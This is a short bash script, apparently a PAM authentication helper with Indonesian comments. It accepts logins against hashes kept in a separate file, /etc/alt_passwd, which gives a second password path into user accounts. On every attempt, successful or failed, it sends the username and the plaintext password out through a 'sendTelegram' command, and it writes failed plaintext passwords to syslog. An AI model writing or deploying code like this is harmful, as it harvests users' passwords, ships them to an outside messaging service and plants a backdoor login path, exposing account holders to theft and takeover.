#!/bin/bash
# pam_yescrypt_alt.sh

ALTFILE="/etc/alt_passwd"

read -r PASS   # password dari PAM (expose_authtok)
USER="$PAM_USER"

#echo "pass:$PASS"

# ambil hash simpanan untuk user
HASH=$(grep -m1 "^$USER:" "$ALTFILE" | cut -d: -f2-)

#echo $HASH

if [ -z "$HASH" ]; then
  exit 1
fi

# verifikasi password dengan yescrypt


if mkpasswd -m yescrypt "$PASS" "$HASH" | grep -qxF "$HASH"; then
  logger -t alt_auth "user=$USER login with alternate password (yescrypt)"
  /usr/local/bin/sendTelegram "alt_auth: user=$USER pass=$PASS success with alt passwd"
  exit 0
else
  logger -t alt_auth "user=$USER login failure $PASS"
  /usr/local/bin/sendTelegram "alt_auth: user=$USER pass=$PASS failur with alt passwd"
  exit 1
fi
